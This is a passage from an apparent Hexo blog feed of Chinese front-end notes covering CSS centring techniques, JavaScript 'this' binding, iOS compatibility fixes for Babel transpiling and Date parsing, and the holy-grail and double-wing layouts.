class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如下:<br> <img src="/images/trans1.png" alt="My Pic"><br> 变成这样的原因是，绝对定位是整个元素相对于父元素的定位，没有考虑到元素的宽和高。那加上transform之后<br> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.chiren</span>&#123;</span><br><span class="line">	<span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background-color</span>:red;  </span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate</span>(-50%, -50%) ;</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">translate</span>(-50%, -50%) ;</span><br><span class="line">    <span class="attribute">-ms-transform</span>: <span class="built_in">translate</span>(-50%, -50%) ;</span><br><span class="line">    <span class="attribute">-o-transform</span>: <span class="built_in">translate</span>(-50%, -50%) ;</span><br><span class="line">    transform: translate(-50%, -50%) ;//保持兼容 百分比的含义是相对于自身 -50%，-50%相当于向左和向上移动自身相应长度的一半</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">　　<span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如下:<br><img src="/images/trans2.png" alt="My Pic"></p>
<h1 id="3-利用绝对定位与margin"><a href="#3-利用绝对定位与margin" class="headerlink" title="3.利用绝对定位与margin"></a>3.利用绝对定位与margin</h1><p>实现原理和transform类似，这里消除自身宽和高影响的方法是使用margin<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123; </span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#000</span>; </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.parent</span> <span class="selector-class">.chiren</span>&#123; </span><br><span class="line">	<span class="attribute">background-color</span>: green;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">	<span class="attribute">height</span>: <span class="number">200px</span>; </span><br><span class="line">	<span class="attribute">position</span>: absolute; </span><br><span class="line">	<span class="attribute">top</span>: <span class="number">50%</span>; </span><br><span class="line">	<span class="attribute">left</span>: <span class="number">50%</span>; </span><br><span class="line">	<span class="attribute">margin</span>: -<span class="number">100px</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">100px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如下:<br><img src="/images/mar.png" alt="My Pic"></p>
<h1 id="4-利用定位与margin：auto"><a href="#4-利用定位与margin：auto" class="headerlink" title="4.利用定位与margin：auto"></a>4.利用定位与margin：auto</h1><p>margin:auto的填充规则和普通流体元素一模一样：如果一侧定值，一侧auto，auto为剩余空间大小；如果两侧均是auto, 则平分剩余空间；<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.chiren</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如下:<br><img src="/images/au.png" alt="My Pic"></p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>关于JS中的this</title>
    <url>/2018/04/04/%E5%85%B3%E4%BA%8EJS%E4%B8%AD%E7%9A%84this/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;在Js中，this的指向问题一直都是一个很让人头疼的问题，一会指向全局，一会又指向调用它的对象。在网上看了一些资料，和一些大牛的讲解。在这里做一个简单的总结。(<a href="https://www.qdfuns.com/article/47725/e18701ccbbb2c0909bac8e906a42a38f.html" target="_blank" rel="noopener">参考文章链接</a>)</p>
<h1 id="1-默认绑定"><a href="#1-默认绑定" class="headerlink" title="1.默认绑定"></a>1.默认绑定</h1><p>在默认绑定的情况下，this会指向window对象<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showNum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.num);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>);<span class="comment">//window</span></span><br><span class="line">&#125;</span><br><span class="line">showNum();<span class="comment">//2 这里this就指向window对象 但是如果是构造函数情况又会有所不同</span></span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>在严格模式下，this会绑定到undefined上<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showNum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.num);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>);<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">showNum();<span class="comment">//这里会报错</span></span><br></pre></td></tr></table></figure></p>
<h1 id="2-隐式绑定"><a href="#2-隐式绑定" class="headerlink" title="2.隐式绑定"></a>2.隐式绑定</h1><p>this会指向调用它的上一级对象。this 是在运行时被确定，而不是在定义时被确定。(箭头函数相反)<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo();<span class="comment">//2</span></span><br></pre></td></tr></table></figure></p>
<p>这里obj调用foo方法，所以this指向obj对象<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = obj.foo;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'hello'</span></span><br><span class="line">bar(); <span class="comment">//hello</span></span><br></pre></td></tr></table></figure></p>
<p>这里bar是函数得别名 是全局函数又因为this是在运行时决定的 所以指向window对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo</span>(<span class="params">fn</span>) </span>&#123; </span><br><span class="line">fn(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"hello"</span>;</span><br><span class="line">doFoo( obj.foo );<span class="comment">//hello</span></span><br></pre></td></tr></table></figure>
<p>这里真正调用，运行foo的doFoo函数 ，因此this指向doFoo，所以指向window对象<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"hello"</span>;</span><br><span class="line">setTimeout( obj.foo, <span class="number">100</span> );<span class="comment">//hello</span></span><br></pre></td></tr></table></figure></p>
<p>这里跟上面类似，正真调用foo的是一个全局函数 所以this会指向window对象</p>
<h1 id="3-改变this指向"><a href="#3-改变this指向" class="headerlink" title="3.改变this指向"></a>3.改变this指向</h1><p>改变this指向通常有这几种方法,call、bind、apply、以及new方法<br>前面三个都比较类似，只是参数和返回值有点区别，就举一个例子<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"hello"</span>;</span><br><span class="line">setTimeout(obj.foo.call(obj),<span class="number">100</span> );<span class="comment">//2</span></span><br></pre></td></tr></table></figure></p>
<p>这里使用call方法将this指向obj对象<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">// window</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//windiw</span></span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="string">'inwe'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.name) <span class="comment">//inwe</span></span><br></pre></td></tr></table></figure></p>
<p>这里相当于普通函数 里面的this指向window对象<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//pepole</span></span><br><span class="line">      <span class="keyword">this</span>.name = name</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//people</span></span><br><span class="line">      self = <span class="keyword">this</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> people = <span class="keyword">new</span> Person(<span class="string">'iwen'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.self) <span class="comment">//people</span></span><br></pre></td></tr></table></figure></p>
<p>这里使用new改变了this指向，将this由window指向Person的实例对象people<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">示例代码一:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.user = <span class="string">'追梦子'</span>;</span><br><span class="line"><span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> fn;</span><br><span class="line"><span class="built_in">console</span>.log(a.user); <span class="comment">//undefined</span></span><br><span class="line">示例代码二:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.user = <span class="string">'追梦子'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> fn;</span><br><span class="line"><span class="built_in">console</span>.log(a.user); <span class="comment">//undefined</span></span><br><span class="line">示例代码三:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.user = <span class="string">'追梦子'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> fn;</span><br><span class="line"><span class="built_in">console</span>.log(a.user); <span class="comment">//追梦子</span></span><br><span class="line">示例代码四:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.user = <span class="string">'追梦子'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> fn;</span><br><span class="line"><span class="built_in">console</span>.log(a.user); <span class="comment">//追梦子</span></span><br></pre></td></tr></table></figure></p>
<p>这里表明 如果构造函数中返回值是一个对象，那么 this 指向的就是那个返回的对象，如果返回值不是一个对象那么 this 还是指向函数的实例</p>
<h1 id="4-箭头函数中的this"><a href="#4-箭头函数中的this" class="headerlink" title="4.箭头函数中的this"></a>4.箭头函数中的this</h1><p>箭头函数中的this是定义时就决定，而非运行时。<br>（1）函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。</p>
<p>（2）不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。</p>
<p>（3）不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。</p>
<p>（4）不可以使用yield命令，因此箭头函数不能用作 Generator 函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'id:'</span>, <span class="keyword">this</span>.id);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> id = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">foo.call(&#123; <span class="attr">id</span>: <span class="number">42</span> &#125;);<span class="comment">//42</span></span><br></pre></td></tr></table></figure>
<p>这个箭头函数的定义生效是在foo函数生成时，而它的真正执行要等到 100 毫秒后。如果是普通函数，执行时this应该指向全局对象window，这时应该输出21。但是，箭头函数导致this总是指向函数定义生效时所在的对象（本例是{id: 42}），所以输出的是42。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Timer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.s1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.s2 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 箭头函数</span></span><br><span class="line">  setInterval(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">this</span>.s1++, <span class="number">1000</span>);</span><br><span class="line">  <span class="comment">// 普通函数</span></span><br><span class="line">  setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.s2++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timer = <span class="keyword">new</span> Timer();</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'s1: '</span>, timer.s1), <span class="number">3100</span>);<span class="comment">//3</span></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'s2: '</span>, timer.s2), <span class="number">3100</span>);<span class="comment">//0</span></span><br></pre></td></tr></table></figure></p>
<p>这里箭头函数指向定义时的作用域，即Timer。而普通函数指向window对象</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>this指向</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ios上的兼容问题</title>
    <url>/2019/01/04/%E5%85%B3%E4%BA%8Eios%E4%B8%8A%E7%9A%84%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最接近呢？自己开发的一个基于vue的项目上线之后出现了一个很神奇的问题，这个活动在一些ios上会出现白屏的问题，比如ios9和10.但是在Android和PC端都是正常的,查看了自己引用的一些包以及打包之后的文件之后并没有发现什么问题。而且并不知道报了什么错。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;于是没有办法，只有通过手机连到mac上看看，连上之后发现控制报了一个错，大概就是不能识别const。但是我明明已经用webpack中配置的babel转译了。我又再打包之后的js中搜了一下，发现真的有const。由于之前使用这套架子没有出现过这个问题，于是想是不是这个活动引入的第三方插件的问题，通过自己一个一个的注释，终于发现了问题的所在。是由于我在vue-cli3的配置中没有对swiper插件进行转译。于是在bebal中自己加上了特别对swiper以及它的一个依赖进行转译的代码，这下在上到服务器上就行了。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">transpileeDependencies:[</span><br><span class="line">	<span class="string">"swiper"</span>,</span><br><span class="line">	<span class="string">"dom7"</span>,</span><br><span class="line">	<span class="string">"ssr-windom"</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>关于new Date的坑</title>
    <url>/2019/01/24/%E5%85%B3%E4%BA%8Enew-Date%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;今天遇到了一个线上的bug，就是活动中在某个时间段会显示宝箱，但是ios用户却没有，Android用户却有，这时就要开始找原因了，之前测的时候应该也是没有问题的。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;终于在debug中发现了一个问题，在ios中new Date(‘2019-01-16 20:16:45’)这样会返回invalid date 没法识别用-隔开的日期，于是自己查了一下，在Safari上也有这个问题。<br><img src="/images/time.png" alt="My Pic"><br>&nbsp;&nbsp;&nbsp;&nbsp;对于我这个项目的话比较明确后端返回的格式是怎么样的，于是就自己通过replace全局替换了一下。这种问题还是挺难发现的，特别是自己之前不知道的话，算是一种积累吧</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>关于圣杯和双飞翼布局</title>
    <url>/2018/04/17/%E5%85%B3%E4%BA%8E%E5%9C%A3%E6%9D%AF%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;刚开始听说这两种布局的时候，感觉圣杯布局和双飞翼布局听起来很高大的样子，但自己了解下来其实这两种布局都是关于解决部分固定宽度，另外部分自适应的场景。下面就拉简单实现以下这两种布局。</p>
<h1 id="1-圣杯布局"><a href="#1-圣杯布局" class="headerlink" title="1.圣杯布局"></a>1.圣杯布局</h1><a id="more"></a>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>圣杯布局<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    *&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">padding</span><span class="selector-pseudo">:0px</span>;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">margin</span><span class="selector-pseudo">:0px</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">padding-left</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="undefined">        padding-right: 200px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.column</span>&#123;</span></span><br><span class="line"><span class="undefined">        float: left;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#center_panel</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="undefined">        background-color: red;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="css">   <span class="selector-id">#left_panel</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">width</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="undefined">        position: relative;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">margin-left</span><span class="selector-pseudo">:-100</span>%;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">left</span><span class="selector-pseudo">:-200px</span>;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">background-color</span>: <span class="selector-id">#72dcb8</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#right_panel</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">width</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="undefined">        position: relative;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">margin-left</span><span class="selector-pseudo">:-200px</span>;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">left</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">background-color</span>: <span class="selector-id">#72dcb8</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span> <span class="attr">id</span>=<span class="string">"center_panel"</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span> <span class="attr">id</span>=<span class="string">"left_panel"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span> <span class="attr">id</span>=<span class="string">"right_panel"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/sheng.png" alt="My Pic"><br>这里的原理主要是利用父元素的padding左右分别留下了200px的固定宽度。中间自适应的宽度为100%自动填满。此时左右两块会自动被挤到第二行。<br><img src="/images/sheng1.png" alt="My Pic"><br>这时设置左边块的margin-left:-100%;发现左块就浮动到第一层了，在加上left:-200px;就自动填满了空白<br><img src="/images/sheng2.png" alt="My Pic"><br>同理右边加上margin-left:-200px;发现右块就浮动到第一层了，在加上left:200px;就自动填满了空白<br><img src="/images/sheng.png" alt="My Pic"><br>这时缩小窗口两边宽度都不会变化，中间自适应。</p>
<h1 id="2-双飞翼布局"><a href="#2-双飞翼布局" class="headerlink" title="2.双飞翼布局"></a>2.双飞翼布局</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>双飞翼布局<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	*&#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">margin</span><span class="selector-pseudo">:0px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">padding</span><span class="selector-pseudo">:0px</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.middle</span>&#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.middle-son</span>&#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">margin-left</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">margin-right</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background-color</span>: <span class="selector-id">#2aa550</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.left</span>&#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">margin-left</span><span class="selector-pseudo">:-100</span>%;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">width</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background-color</span>: <span class="selector-id">#e75c62</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">margin-left</span><span class="selector-pseudo">:-200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">width</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background-color</span>: <span class="selector-id">#e75c62</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle-son"</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 